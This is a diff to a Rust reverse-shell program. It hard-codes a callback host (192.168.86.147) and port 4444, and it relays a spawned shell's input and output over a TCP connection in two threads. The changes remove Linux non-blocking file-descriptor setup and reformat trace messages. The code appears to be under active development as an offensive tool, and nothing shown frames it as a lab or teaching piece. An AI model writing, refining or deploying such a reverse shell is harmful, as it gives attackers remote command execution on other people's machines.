@@ -19,7 +19,6 @@ use std::thread;
 use std::sync::Arc;
 use std::time::Duration;
 use std::sync::atomic::{AtomicBool, Ordering};
-use std::os::unix::io::AsRawFd;
 
 const LHOST : &str = "192.168.86.147";
 const LPORT : &str = "4444";
@@ -52,18 +51,6 @@ fn handle_network_connection(stream: TcpStream) {
     let shell_reading_finished = Arc::clone(&finished);
     let network_reading_finished = Arc::clone(&finished);
 
-    // Make shell stdin/stdout non-blocking.
-    if cfg!(target_os = "linux") {
-        unsafe {
-            let fd_shell_out = shell_out.as_raw_fd();
-            let flags_shell_out = libc::fcntl(fd_shell_out, libc::F_GETFL);
-            let _ = libc::fcntl(fd_shell_out, libc::F_SETFL, flags_shell_out | libc::O_NONBLOCK);
-            let fd_shell_in = shell_in.as_raw_fd();
-            let flags_shell_in = libc::fcntl(fd_shell_in, libc::F_GETFL);
-            let _ = libc::fcntl(fd_shell_in, libc::F_SETFL, flags_shell_in | libc::O_NONBLOCK);
-        }
-    }
-
     debug!("Beginning IO read/write loops");
 
     // Thread to read from shell and write to network
@@ -82,7 +69,7 @@ fn handle_network_connection(stream: TcpStream) {
                     if read_count > 0 {
                         match network_in.write(&mut buffer[0..read_count]) {
                             Ok(write_count) => {
-                                trace!("shell --> {:>3} --> socket", write_count);
+                                trace!("shell ---{:>03}--> socket", write_count);
                                 network_in.flush().unwrap();
                             },
                             Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
@@ -127,9 +114,10 @@ fn handle_network_connection(stream: TcpStream) {
             match network_out.read(&mut buffer) {
                 Ok(read_count) => {
                     if read_count > 0 {
+
                         match shell_in.write(&mut buffer[0..read_count]) {
                             Ok(write_count) => {
-                                trace!("shell <-- {:>3} <-- socket", write_count);
+                                trace!("shell <--{:>03}--- socket", write_count);
                                 shell_in.flush().unwrap();
                             },
                             Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
